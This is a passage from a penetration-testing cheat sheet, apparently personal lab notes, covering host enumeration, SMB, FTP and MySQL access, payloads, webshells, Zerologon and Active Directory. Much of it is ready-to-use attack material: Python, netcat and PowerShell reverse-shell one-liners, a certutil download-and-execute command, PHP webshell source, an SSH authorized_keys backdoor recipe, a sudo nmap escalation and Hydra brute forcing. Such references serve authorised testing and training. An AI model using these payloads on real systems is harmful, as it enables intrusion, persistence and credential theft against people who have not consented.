    whoami /priv			:Current User privs
    net users				:List Users
    net user $USER			:Filter Users i.e *admin*
    qwinsta					:Other Logged-in users
    net localgroup			:List Groups
    net localgroup $GROUP	:Filter Group i.e Administrators

#SYSTEM
    systeminfo												:Dump System Info	
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"	:Filter Name, Version
    hostname												:Dump Hostname
    netstat -ano											:Active Connections, Listening ports, prevent DNS Resolves
    driverquery												:List drivers

#SERVICES
    $SERVICE												:Exact service name
    wmic qfe get Caption,Description,HotfixID,InstalledOn	:List Updates on system
    wmic service list										:List services
    wmic service list brief | findstr "Running"				:Filter "Running"
    wmic product											:Dumps Installed programs, Info overload
    wmic product get name,version,vendor					:Dumps installed programs, Clean output
    sc qc $SERVICE
    net stop $SERVICE && net start $SERVICE					:Stop/Start service

#SEARCHING
    /s		:Searching
    /b		:barebones
    $STRING	:String to search within *.txt (all .txt files)
    /si 	:ignore upper/lowercase differences
    *.txt	: Target all .txt, xml, ini, config, xls files.
    dir /s /b *$FILE*		:Wildcard searching "*file*.txt"
    findstr /si $STRING *.txt	:Search current, sub dir for patterns of $STRING

#DOWNLOADING
    $LHOST:$LPORT											:Listening Host:Port
    $FILE													:File name
    %tmp%													:Easily navigated directory
    wget "$LHOST:$LPORT/$FILE" -o %tmp%\$FILE

```

[Back to Top](#table-of-contents)

## Shell-PowerShell

```powershell
#User/Group Enumeration
    $USER	:User name
    $GROUP	:Group name
    whoami /priv			:Current User privs
    net users				:List Users
    Get-LocalUsers          :Alternative
    net user $USER			:Filter Users i.e *admin*
    qwinsta					:Other Logged-in users
    net localgroup			:List Groups
    Get-Localgroup          :Alternative
    net localgroup $GROUP	:Filter Group i.e Administrators

#System Enumeration
    systeminfo												:Dump System Info	
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"	:Filter Name, Version
    hostname												:Dump Hostname
    netstat -ano											:Active Connections, Listening ports, prevent DNS Resolves
    Get-Process                                             :List running processes
    driverquery												:List drivers
    Get-Hotfix                                              :Patches installed
    sc query windefend										:Antivirus enumeration
    sc queryex type=service									:Antivirus enumeration
    Get-NetIPAddress

#HELP
    Get-Help $COMMAND -examples                             :Similar to man-pages, get help on command and show examples of usage

#Services
    Get-Service												:All services
    Get-Service | Sort-Object status						:Sorting
    Get-Service -Displayname "*network*"					:search string with wildcards
    Get-Service | Where-Object {$_.Status -eq "Running"}	:"Running" or "Stopped" services
    (Get-Item -Path '$PATH').VersionInfo |Format-List -Force:Get specific version info
    net stop $SERVICE && net start $SERVICE					:Stop/Start service

#Version
    $PROGRAMpath:Path/to/program.exe
    (Get-Item -Path '$PROGRAMpath').VersionInfo | Format-List -Force	:Version info for program

#Searching
    -exclude $EX                                                                                                   :Exclude items from being searched
    Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue                           :Search for backup files
    Get-ChildItem ~ -Recurse -Filter *.txt | where {$_.name -match 'interesting'} | select FullName                :Find .txt files with title 'interesting'
    Get-ChildItem c:\ -Recurse -Filter *.txt | Select-String -pattern "Pass"                                       :Find .txt files containing 'Pass'
    Get-ChildItem ~ -Recurse | where {$_.LastWritetime -gt (get-date).AddMinutes(-10)} | select fullname           :Find recently modified files in last 10 minutes
    Get-FileHash -Path "C:\Program Files\interesting-file.txt.txt" -Algorithm MD5                                  :Get MD5 Hash of a file

    Get-LocalUser -SID "$SID"
    Get-LocalUser | Where-Object -Property PasswordRequired -Match false

#Downloading
    $LHOST	:Listening Host
    $FILE	:File name
    %tmp%	:Easily navigated file location

    Invoke-WebRequest $LHOST/$FILE -outfile %tmp%\$FILE
    wget "$LHOST/$FILE" -outfile %tmp%\$FILE

#Scheduled Tasks
    schtasks						:Show all scheduled tasks
    schtasks /query /fo /LIST /v	:Filter and list
    Get-ScheduleTask -TaskName $TASK

#DECODE
    certutil -decode $FILE $SAVEfile


```

```powershell
#Search All files to find pattern and display files/lines in output
$path = "C:\Users\Administrator\Desktop\emails\*"  
$string_pattern = "password"  
$command = Get-ChildItem -Path $path -Recurse | Select-String -Pattern $String_pattern echo $command
```

[Back to Top](#table-of-contents)

## Shell-Linux-SSH

**EXPLOIT SUDO NMAP:**

```powershell
#OLD NMAP VERSION
    sudo nmap --interactive or nmap --interactive
    !sh or !bash

#NEWER NMAP VERSION
    echo "os.execute('/bin/sh')" > /tmp/shell.nse
    sudo nmap --script=/tmp/shell.nse

```

**QUICK REFERENCE:**

```powershell
#SUDO
    sudo -l

#CRON
    cat /etc/crontab	:Check privileged cronjobs

#SUID
    find / -type f -perm -04000 -ls 2>/dev/null		:Find SUID bits
    [GTFO](https://gtfobins.github.io/#+suid)		:Check for vulnerabilities

#CAPABILITIES
    getcap -r / 2>/dev/null	:Run for current user

#NFS
    showmount -e $RHOST		:[ATTACKER]
    cat /etc/exports		:[TARGET]

#SCP
    scp $USER@$RHOST:$FILEpath $SAVElocation :Download
    scp $FILEpath $USER@$RHOST:$SAVElocation :Upload

#SSH
    ssh $USER@$RHOST -p $RPORT				:Login
    ssh -i $ID_RSA $USER@$RHOST -p $RPORT	:Private key log in

#SSH REVERSE TUNNELLING
    -L    :(YOU <-- CLIENT) Specifies that the given port on the local (client) host is to be forwarded to the given host and port on the remote side
    -R    :(YOU --> CLIENT)
    ssh -L $PORT:localhost:$PORT $USER@$RHOST
    ssh -R $PORT:localhost:$PORT $USER@$LHOST

#SSH Backdoor
    ssh-keygen -b 4096        :Local machine, generate id_rsa & id_rsa.pub key pair
    
    #ON VICTIM MACHINE
    mkdir /home/$USR/.ssh                                            :Make the directory if it does not exist
    echo "$PUBkey" > /home/$USR/.ssh/id_rsa.pub                      :Just copy paste the id_rsa.pub content and use echo to create a new one.
    echo /home/$USR/.ssh/id_rsa.pub >> authorized_keys               :Adds to 'authorized_keys'; if file does not exist then it will create it
    
    chmod 700 /home/$USR/.ssh                                        :Important to set the privs
    chmod 600 /home/$USR/.ssh/authorized_keys                        :Important to set the privs

    #ATTACKER
    ssh -i id_rsa $USER@$RHOST                      : Optional -p $RPORT
```

**COMMANDS:**

```powershell
#SEARCHING
    find / -name *flag*.txt											:Wilcard filename contains "flag".txt
    find / -type f -perm 0777										:Files with 777 permissions
    find / -type d -name $FILE										:Target directory and filename i.e "config"
    find / -mtime -10` or `-atime`                                  :files **modified** or **accessed** in last 10 days
    find / -cmin -60` or `amin`                                     :files **changed** or **accessed** in last 60 mins
    find / -size 50M` or `+50M` or `-50M`                           :files with 50 MB size, `+/-` used to indicate more or less
    find / -perm -o w -type d 2>/dev/null` or `-o x` for executable :Find world-writeable folders

#SYSTEM
    uname -a						:Kernel version
    ip addr or ifconfig				:Networking Info
    ip route						:Dump routing table
    netstat -ano					:Active connections, listening ports
    ps or ps -A or ps axjf or ps aux:Running processes, output PID, TTY (terminal type), Time: Amount of CPU time used by process
    env								:Environmental variables, path= variable may have compiler or scripting language usable
    id or id $USER					:Overview of user priv levels and group memberships, Can target other users

#FILE LOCATIONS
    /proc/version					:Confirm kernel version, verify compiled "GCC" installed
    /etc/issue						:OS identification
    /etc/passwd | cut -d ":" -f 1 	:All users
    /etc/hosts						:Dump hosts
    /etc/shells						:Dump shells available
    /etc/profile					:System-wide default variables, export variables
    /root/.bash_history				:History commands "root" user
    /root/.ssh/id_rsa				:Private SSH key
    /$USER/.ssh/id_rsa				:User private ssh key
    /var/log/dmessage				:Global system messages
    /var/mail/root					:Emails "root" user
    /var/log/apache2/access.log		:Accessed requests Apache webserver
```

[Back to Top](#table-of-contents)

## Shell-Telnet

```powershell
#CONNECT
    telnet $RHOST:$RPORT -l $USER		:Standard connect, -l $USER optional, $RPORT optional

#SYSTEM
    cat $FILE							:Read file
    ls									:List directory

```

[Back to Top](#table-of-contents)

## Shell-SMB

```powershell
#CONNECT
    -L	:List shares
    -N	:Null login

    smbclient $OPTION //$RHOST/ $OPTION	
    smbclient -L //$RHOST -N			:-L list shares, -N Null login '' ''
    smbclient //$RHOST/$SHARE -N		:-N Optional if Null login '' ''
    smbclient \\\\$RHOST\\$SHARE -N		:Alternative to above

#DOWNLOAD
    get $FILE $SAVElocation				:[SMB Terminal]
    mget $FILE*.txt                     :[SMB Terminal] Download multipl files
    smbget smb://$RHOST/$FILE			:[Attacker]
```

[Back to Top](#table-of-contents)

## Shell-FTP

```powershell
#CONNECT
    ftp $RHOST $RPORT			:Standard connection
    user: "anonymous" pass:"" 	:Test easy entry

#COMMAND
    dir					:Display dir

#DOWNLOAD
    mget $FILE			:Download file
    mget * -y			:All Files from directory
```

[Back to Top](#table-of-contents)

## SHELL-mySQL

**HYDRA BRUTEFORCE:**

```powershell
#WORDLIST
    /usr/share/wordlists/rockyou.txt

#BRUTEFORCE
    -e nsr			:try username backwards, empty etc..
    -l $USER		:common for mysql to have "root" user
    -P $WORDLIST 	:Chosen worldlist

    hydra -e nsr -l root -P $WORDLIST $RHOST mysql
```

**METASPLOIT MODULES:**

```powershell
search mysql_sql			:Dump version, database, command module etc
search mysql_schemadump		:Dump schema database
```

**COMMANDS:**

```powershell
#CONNECT
    mysql -h $RHOST -u $USER -p		:-p to prompt for password
    mysql -h $RHOST -u root			:"root" usually first entry placed in database users

#NAVIGATE
    show $DBS; or show $TABLE;
    use $DBS;

#SELECT
    select * from $DIR/$TABLE;								:Syntax to Dump info, choosing Directory or Table to dump
    select user,password from users;						:Example of selecting from table "users"
    select * from users LIMIT 1; or LIMIT 1,1 or LIMIT 2,1	:1st Number skip, 2nd number rows-to-return
    select user()											:Display current user accessing database

#WHERE
    select * from {users} where {username}='admin';								:where username "admin"
    select * from {users} where {username} != 'admin';							:where non-admin
    select * from {users} where {username}='admin' or {username}='jon';			:where username "Admin" OR "jon"
    select * from {users} where {username}='admin' and {password}='p4ssword';	:where TRUE "admin" and "password"

#INSERT
    insert into {$TABLE} ({$COLUMN1},{$COLUMN2}) values ('bob','password123');	:Insert into column 1,2 the values "bob","password"

#UPDATE
    update {$TABLE} set {$adm}="yes" where {$username}="tracking1";								:Update column values "yes" for "username"
    update {$TABLE} set {$username}='root',{$password}='pass123' where {$username}='admin';		:Change username to "root" and update "password"
    delete from {users} where {username}='martin';												:Delete "martin" column from table
    delete from users;																			:Delete all from table

#LIKE
    select * from {users} where {username} like 'a%';		:Like clause, wildcard % = "return all usernames starting with a"
    select * from {users} where {username} like '%n';		:"Return all usernames ending with n"
    select * from {users} where {username} like '%mi%';		:"Return all usernames containing mi" i.e targeting admin or similar

#UNION
    select {name,address,city,postcode} from customers union select {company,address,city,postcode} from suppliers;		:Must retrieve same number of columns for union.
```

**EXAMPLE INFO FROM DATABASE:**

  > ID      | username    | password             |adm|
  > ---     |---          |---                   |---
  > 1       | `fcadmin1`  | `password hash here` | `yes` 
  > 2       | `fcadmin2`  | `password hash here` | `yes` 
  > 3       | `tracking1`  | `password hash here` | `no` 
  > 4       | `tracking2` | `password hash here` | `no` 

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

# PAYLOADS-SHELLS

Tags: [Msfvenom](#Msfvenom), [Metasploit](#Metasploit), [Windows-Privilege-Escalation](#Windows-Privilege-Escalation), [Common Shell Payloads](#Common%20Shell%20Payloads), [Webshells](#Webshells), [WEB-ATTACKS](#WEB-ATTACKS), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [NC-Netcat](#NC-Netcat), [Common-OS-File-locations](#Common-OS-File-locations)

- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [RevShells - Reverse Shell Generator](https://www.revshells.com/)
- [Hack-Tools Browser Extension (Chrome)](https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi)
- [Pentestmonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

The above is some great resources to manage your payload options and target specific services/languages/system limitations and so forth.

All payloads will require either the use of `netcat` or `socat` or metasploits' `multi/handler` and similar tools in order to have a connection through a specific port. 

> On **attacker host:** For example `nc -lvnp 4444` to establish a listener, waiting for connection on port 4444
> On **attacker host:** might want to *connect* then use `nc $RHOST $PORT` to connect to a listening port

The above is good to understand because the payloads you are using, **reverse shells** need to phone home and establish a connection, so you will need to capture that connection with a listener\
For **bind shells** we are creating a listening on the **target host** (in contrast to us being the listener for reverse shells) and then we are phoning home to that listener ourselves.

## Common-Shell-Payloads

Tags: [Msfvenom](#Msfvenom), [Metasploit](#Metasploit), [Windows-Privilege-Escalation](#Windows-Privilege-Escalation), [Webshells](#Webshells), [WEB-ATTACKS](#WEB-ATTACKS), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [NC-Netcat](#NC-Netcat), [Common-OS-File-locations](#Common-OS-File-locations)

**CERTUTIL/WGET/INVOKE-WEBREQUEST - WINDOWS**

- Using Certutil to deliver payload, similar to `wget` or `Invoke-WebRequest`

> - `Certutil -urlcache -f http://$LHOST:$LPORT/$FILE.exe %tmp%\$FILE.exe` download and place file in %tmp% folder
> - `wget "$LHOST:$LPORT/$FILE.exe" -o %tmp%\$FILE.exe`
> - `Invoke-WebRequest "http://$LHOST/$FILE.exe" -OutFile "%tmp\$FILE.exe" && cmd /c %tmp%\$FILE.exe`

**PYTHON SHELLS:**

- Check is python is available with `which python` or `python -V`; check for different versions such as python2 or python3

> - **Reverse Shell:**
> -  $Target$`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$RHOST",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
> - $Attacker$ `nc -lvnp $LPORT`

**NETCAT SHELL - WINDOWS**

> - Reverse Shell
> - $Attacker$ `nc -lvnp $LPORT -e /bin/bash` to execute /bin/bash upon connection
> - $Target$ `nc $RHOST $RPORT -e /bin/bash` to execute /bin/bash upon connection

The `nc -e` is not normally included in most versions of netcat but kali does have the  windows executable saved in `/usr/share/windows-resources/binaries` and this would need to be transferred over.

**NETCAT SHELL - LINUX**

> - Bind Shell
> - $Attacker$ `nc $RHOST $RPORT` to get the shell
> - $Target$ `mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` listening shell

> - Reverse Shell 
> - $Attacker$ `nc -lvnp $LPORT` listening port
> - $Target$ `mkfifo /tmp/f; nc $RHOST $RPORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` sends reverse shell

**MODERN WINDOWS SERVER:**

Remember to URL-encode if you are running it on a url `get` parameter when **upgrading from webshell to reverse shell**

> - PSH, CMD.exe or Webshell Reverse Shell
> - $Attacker$ `sudo nc -lvnp $LPORT`
> - $Target$ `powershell -c "$client = New-Object System.Net.Sockets.TCPClient("$RHOST",$RPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

---

## Msfvenom

Tags:  [Metasploit](#Metasploit), [Windows-Exploit-Suggester](#Windows-Exploit-Suggester), [Common-Shell-Payloads](#Common-Shell-Payloads), [Webshells](#Webshells), [WEB-ATTACKS](#WEB-ATTACKS), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS)

`msfvenom` is the one stop shop to produce all things payload related.

This tools purpose is to generate primarily **reverse/bind** shell code. It is also used extensively in lower-level exploit development to generate *hexidecimal* shellcode when developing something like **buffer overflow** exploits.

The tool will also generate the payload in various formats such as `.exe .aspx .war .py` and so on.

**Staged** reverse shells are sent in parts. **Requires a special listener: `multi/handler`**
- First part is *stager*; code executed directly on server itself. Connects back with listener but doesn't contain any reverse shell code by itself.
- Second part is *payload*; after connection is setup and stable, it then proceeds to send the bulkier payload

**Stageless** reverse shells are self contained, one piece of code that is executed and sends a shell back to a waiting listener.
- Stageless are usually bulkier and easier for antivirus or intrusion detection programs to discover and remove
- However modern antivirus and like software can detect staged payloads just as well



|                                                                                                    | Desciption                   |
|:-------------------------------------------------------------------------------------------------- |:---------------------------- |
| @ **Syntax**                                                                                       | ---                          |
| `msfvenom -p {payload} LHOST={attacker ip} LPORT={attacker port} -f {format} -o {shell.extension}` |                              |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`         | example                      |
| `msfvenom --list payloads | grep "linux/x86/meterpreter"`                                           | grep for specific payloads   |
|                                                                                                    |                              |
| @ **Options**                                                                                      | ---                          |
| `-p {path/to/payload}`                                                                             |                              |
| `-o {shell.exe}`                                                                                   | Output location and filename |
| `-f {format .exe .war .aspx .py}`                                                                  | select format                |
|                                                                                                    |                              |


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Webshells



Webshells ran on various technologies, taking advantage of arbitrary file upload and then potentially upgrading the shell with further functionality.\
Webshells are just scripts that run on a webpage either through HTML form or directly as arguments in the URL which is then executed by a script and the output is returned directly in the web page.

This is very useful if there are firewalls in place on the system or as a stepping stone into a fully fledged shell.

**TOMCAT Webshell**
> **Upload, exploit and upgrade to METERPRETER from .WAR/Tomcat Webshell**
> 
> - On **attack host:** Generate `shell.war` file using `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.4.42.21 LPORT=4444 -f war -o shell.war`
> - On **web server:** Check if tomcat website has `http://{url/ip}/manager` and if you can login with default tomcat:s3cret credentials; Upload file 
> - On **attack host:** `nc -lvnp {port}`
> - On **web server:** Execute the code by navigating to `172.16.64.101/shell` or if it doesn't work, append `172.16.64.101/index.jsp` to url
> 
> **Optional: Upgrade to Meterpreter Shell**
> 
> - On **attack host:** Upload upgraded shell such as `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=172.16.64.10 LPORT=8080 -f elf -o meter.war`
> - On **target host:** navigate to find meter.war with the webshell `ls var/lib/tomcat8/webapps` or elsewhere
> - On **target host:** Check to find folder that allows executions i.e copy to /tmp/ folder and rename from .war to just meter `mv /var/lib/tomcat8/webapps/meter.war /tmp/meter`
> - On **target host:** Give the file permissions to execute `chmod +x /tmp/meter`
> - On **attack host:** Run listener with `msfconsole multi/handler`, set payload same as uploaded file `linux/x64/meterpreter_reverse_tcp`, set lhost and lport to correspond
> - On **target host:** able to directly invoke/run a program uploaded `./tmp/meter`
> 
> You should now have a meterpreter shell

**WEB URL PHP Webshell**
By having the code embedded, we can use the `get` parameter to execute shell-like system commands and have the output reflected onto the web page.\
Anything after `?cmd=` such as `http://{ip address}/{uploads}/shell.php?cmd=ifconfig` will be ran be it windows or linux.
> `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`


**CODING PHP SHELL:**

Coding and using `PUT` to upload PHP shell to the victim server.

> - Shell has same permissions of the web server it runs on i.e writing a file, reading a file, or read a system file
> - Remember, `PUT` passes the content length so we need to use the `wc -m` command to build our request

```php
<?php
if (isset($_GET['cmd'])) # runs only if the GET cmd parameter is set
{
  $cmd = $_GET['cmd']; # read the command to execute
  echo '<pre>';
  $result = shell_exec($cmd); # Runs the command using the OS shell
  echo $result; # Displays the output of the command
  echo '</pre>'; 
}
?>
```

**Example of setting up payload for PUT:**

![](https://i.imgur.com/Rn0aeI5.png)

**Example of using PHP Shell in browser:**

![](https://i.imgur.com/zILBG8C.png)

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## ZEROLOGON

**Important note:** DO NOT RUN THE EXPLOIT unless it has been signed off by client or such due to it **breaking the domain controller** for a short period of time until you fix it.

Recommended to test in internal penetration tests.

**SCRIPT LOCATION**

> - `searchsploit zerologon`
> - `searchsploit -m windows/remote/49071.py`
> - modify the script as it is slightly broken

**SCRIPT USE**

> - `python3 49071.py -do check -target $DOMAINNAME -ip $RHOST`  **check** to only check for the exploit, not to run **this is safe to run**

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

# DATABASES

## MySQL

**HYDRA BRUTEFORCE:**

- /usr/share/wordlists/rockyou.txt

> `hydra -e nsr -l $root -P $FILEwordlist $RHOST mysql`

**METASPLOIT MODULES:**

> - `search mysql_sql` version,database,command module
> - `search mysql_schemadump`

|                                                                                       | Description                                                                                           
|:------------------------------------------------------------------------------------- |:----------------------------------------------------------------------------------------------------- |
| @ **Connection Syntax**                                                               | ---                                                                                                   |
| `mysql -h $RHOST -u $USER -p`                                                         | Attempt login through protocol, `-p` to prompt for password after attempting connection               |
| `mysql -h $RHOST -u root`                                                             | root is usually the first entry into mysql                                                            |
|                                                                                       |                                                                                                       |
| @ **Database Navigation**                                                             | ---                                                                                                   |
| `show {databases};` or  `{tables};`                                                   | display databases, or tables in selected directory                                                    |
| `use {database};`                                                                     | Select and navigate to **database**                                                                   |
|                                                                                       |                                                                                                       |
| @ **Select Clause**                                                                   | ---                                                                                                   |
| `select * from {directory or table};`                                                 | select **all** from **table** or **directory** to select a specific entry in table                    |
| `select {username},{password} from {users};`                                          | Select only **username** & **password** from the table                                                |
| `select * from {users} LIMIT 1;` or `LIMIT 1,1` or `LIMIT 2,1`                        | 1st number is skip, 2nd number is rows to return, i.e Skip first 2 rows and return 1 row from {users} |
| `select user()`                                                                       | display user currently accessing database                                                             |
|                                                                                       |                                                                                                       |
| @ **Where Clause**                                                                    | ---                                                                                                   |
| `select * from {users} where {username}='admin';`                                     | Filter from {users} table and only display where username is admin                                    |
| `select * from {users} where {username} != 'admin';`                                  | Filter non-admin                                                                                      |
| `select * from {users} where {username}='admin' or {username}='jon';`                 | Either admin or jon                                                                                   |
| `select * from {users} where {username}='admin' and {password}='p4ssword';`           | **and** condition, where username and password matches                                                |
|                                                                                       |                                                                                                       |
| @ **Insert Clause**                                                                   | ---                                                                                                   |
| `insert into {users} ({username},{password}) values ('bob','password123');`           | select (first column, second column) and add ('bob' into first, 'password123' into second)            |
|                                                                                       |                                                                                                       |
| @ **Update Tables**                                                                   | ---                                                                                                   |
| `UPDATE {users} SET {adm}="yes" WHERE {username}="tracking1";`                        | example of adjusting values in table with the right credentials                                       |
| `update {users} set {username}='root',{password}='pass123' where {username}='admin';` | update column entry with new values, change admin username to root and update to new password         |
|                                                                                       |                                                                                                       |
| @ **Update Tables**                                                                   | ---                                                                                                   |
| `delete from {users} where {username}='martin';`                                      | Delete column for the user martin                                                                     |
| `delete from users;`                                                                  | Delete all from table **users**                                                                       |
|                                                                                       |                                                                                                       |
| @ **Like Clause**                                                                     | ---                                                                                                   |
| `select * from {users} where {username} like 'a%';`                                   | Like clause, using wildcard % returning all usernames starting with **a**                             |
| `select * from {users} where {username} like '%n';`                                   | Wildcard % selecting all usernames ending with **n**                                                  |
| `select * from {users} where {username} like '%mi%';`                                 | Wildcard %, return all usernames with a **mi** within them                                            |

**UNION SELECT:**

> - **Union** clause requires that the query *must retrieve* the **same number of columns** in each select statement. 
> - Columns must be of **similar data type** and column **order must be the same**
> - `SELECT {name,address,city,postcode} from customers UNION SELECT {company,address,city,postcode} from suppliers;`

**EXAMPLE INFO FROM DATABASE:**

  > ID      | username    | password             |adm|
  > ---     |---          |---                   |---
  > 1       | `fcadmin1`  | `password hash here` | `yes` 
  > 2       | `fcadmin2`  | `password hash here` | `yes` 
  > 3       | `tracking1`  | `password hash here` | `no` 
  > 4       | `tracking2` | `password hash here` | `no` 

  > Adjusted with `UPDATE users SET adm="yes" WHERE username="tracking1"` to give tracking1 admin rights

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## NoSQL

NoSQL or Non SQL refers to not-only-sql and is a **non relational database** unlike MySQL and MSSQL. It is a data-storing and retrieving system that allows fast queries, scalability and flexible data structures. NoSQL databases take the form of MongoDB, Couchbase and RavenDB etc..

**MONGO DB**

**USEFUL COMMANDS:**

> - `use` - select or create database
> - `show $DATABASE $TABLES` - show $SELECT: databases, tables
> - `db.createCollection("$NAME")` - Create Collection
> - `db.getCollectionNames ()` - show Collections
> - `db.$COLLECTION.insert({id:"$2", username: "user", email: "user@thm.labs", password: "password1!"})` 
> - `db.$COLLECTION.find()` - show all in $COLLECTION
> - `db.$COLLECTION.update({id:"2"}, {$set: {username: "tryhackme"}})` - "$set" is required to be written as is.
> - `db.$COLLECTION.remove({'id':'2'})` - remove item
> - `db.$COLLECTION.drop()` - drop tables

Documents in MongoDB are stored in **BSON** format, which supports JSON data types for document storing.

Similar to MySQL and MSSQL however the names will differ:

| MySQL or MSSQL  | MongoDB         |
|:--------------- |:--------------- |
| Tables or Views | **Collections** |
| Rows or Records | **Documents**   |
| Columns         | **Fields**      |
| AND             | $and            |
| OR              | $or             |
| =               | $eq             |

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## MSSQL

Microsoft SQL service

**CONNECTING**

Note: MSSQL takes commands then waits for the SQL batch to be sent with `go`. So you will enter command i.e `SHOW * FROM reindeer.dbo.names;` and then you will need to use `go` to send the request.

Some MS SQL Servers have `xp_cmdshell` enabled. If this is the case, we might have access to something similar to a command prompt.

```powershell
$RHOST		: Target IP
$USER		: Valid Username
$PASS		: Valid Password
$COMMAND	: whoami, dir, type etc..
```

> - `sqsh -S $RHOST -U $USER -P $PASS` Connection to MSSQL with sqsh
> - `SELECT * FROM table_name WHERE condition;`
> - `SELECT * FROM $DB.dbo.$TABLE;`
> - `xp_cmdshell '$COMMAND';`

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

# Active-Directory

Tags: [KERBEROS](#KERBEROS), [Kerbrute](#Kerbrute), [Kerberos-Roast](#Kerberos-Roast), [Asrep-Roast](#Asrep-Roast), [Impacket](#Impacket), [CrackMapExec](#CrackMapExec), [Windows-Hashes](#Windows-Hashes), [Windows-Exploit-Suggester](#Windows-Exploit-Suggester), [Windows-Privilege-Escalation](#Windows-Privilege-Escalation), [Mimikatz](#Mimikatz)

Active Directory is used by large companies to monitor and control the users of the network and it is also used by the users to be able to move between various machines such as computers and printers,\
while using the same login and having the documents be made available on each machine.

Users, i.e systems, computers, prints, employees is the reason for Active Directory and through it's use, it can specify restrictions, control permissions and maintain a secure system.

Normally Active Directory is invoked on the Domain Controller server and controlled by the domain admins. 

**List of default Security Groups**

```powershell
Domain Controllers						:All domain controllers in the domain
Domain Guests							:All domain guests
Domain Users							:All domain users
Domain Computers 						:All workstations and servers joined to the domain
Domain Admins 							:Designated administrators of the domain
Enterprise Admins 						:Designated administrators of the enterprise
Schema Admins 							:Designated administrators of the schema
DNS Admins 								:DNS Administrators Group
DNS Update Proxy 						:DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
Allowed RODC Password Replication Group :Members in this group can have their passwords replicated to all read-only domain controllers in the domain
Group Policy Creator Owners 			:Members in this group can modify group policy for the domain
Denied RODC Password Replication Group 	:Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
Protected Users 						:Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
Cert Publishers 						:Members of this group are permitted to publish certificates to the directory
Read-Only Domain Controllers			:Members of this group are Read-Only Domain Controllers in the domain
Enterprise Read-Only Domain Controllers :Members of this group are Read-Only Domain Controllers in the enterprise
Key Admins								:Members of this group can perform administrative actions on key objects within the domain.
Enterprise Key Admins					:Members of this group can perform administrative actions on key objects within the forest.
Cloneable Domain Controllers			:Members of this group that are domain controllers may be cloned.
RAS and IAS Servers						:Servers in this group can access remote access properties of users
```

Usually indicated by `port 88` that signals kerberos and is *almost always a signal* for a domain controller.


**SIGNAL PORTS:**

> - `port 88` - Kerberos
> - `port 53` - DNS, typically a UDP port however requires TCP in order to complete zone transfers. This is normally the case where the domain controller is also the DNS server as well
> - `port 389` - LDAP shares domain information, domain controllers will obviously have ldap open
> - `port 3389` - Remote Desktop, usually for domain controllers

**HELPFUL COMMANDS:**

> - `nmap -sC -sV`, -sC default scripts is helpful on domain controllers as it will find the **FULLY QUALIFIED DOMAIN NAMES**= `DNS_Computer_Name` and **NETBIOS NAME**= `NetBIOS_Computer_Name` which is very important to know both.

**HELPFUL TOOLS:**

- [CrackMapExec](#CrackMapExec)
- [Impacket](#Impacket)
- [Kerbrute](#Kerbrute)
- [Asrep-Roast](#Asrep-Roast)
- [Winrm](#Winrm)
- [Evil-Winrm](#Evil-Winrm)

> - `bloodhound-python -c All -u '$USER' -p '$PASS' -gc '$NETBIOSNAME.$DOMAIN' -dc '$DNSNAME.$DOMAIN' -d '$DOMAIN' -ns $RHOST`

The initial credentials is absolutely crucial for Active Directory as it allows use of tools `bloodhound`, `powerview`, interact with `kerberos` with `asrep roast` and `kerberoast`

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## KERBEROS

Tags: [CrackMapExec](#CrackMapExec), [Impacket](#Impacket), [Kerbrute](#Kerbrute), [Asrep-Roast](#Asrep-Roast), [Rubeus](#Rubeus), [Mimikatz](#Mimikatz), [Kerberos-Roast](#Kerberos-Roast), [Golden Silver-Tickets](#Golden%20Silver-Tickets), [Active Directory](#Active%20Directory)

Kerberos is a Key Authentication service within Active Directory. With this port open we can use a tool called __Kerbrute__ and __CrackMapExec__.

`crackmapexec` is a great tool to enumerate with kerberos/domain controllers. 

![](https://i.imgur.com/IQaFWqv.png)

Attack Privilege Requirements -

    Kerbrute Enumeration - No domain access required 
    Pass the Ticket - Access as a user to the domain required
    Kerberoasting - Access as any user required
